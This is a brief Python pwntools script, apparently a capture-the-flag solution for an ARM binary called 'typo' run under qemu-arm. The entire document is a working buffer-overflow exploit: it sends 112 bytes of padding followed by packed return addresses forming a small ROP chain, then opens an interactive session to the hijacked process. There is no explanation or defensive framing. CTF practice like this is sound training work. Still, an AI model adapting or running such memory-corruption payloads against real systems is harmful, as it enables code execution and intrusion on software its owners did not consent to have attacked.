from pwn import *

payload = "A"*112 + p32(0x20904) + p32(0x6c384)*2 + p32(0x110b4)

p = process(["qemu-arm","typo"])
p.recvuntil("quit")
p.send("\n")
p.recvuntil("----")
p.sendline(payload)
p.interactive()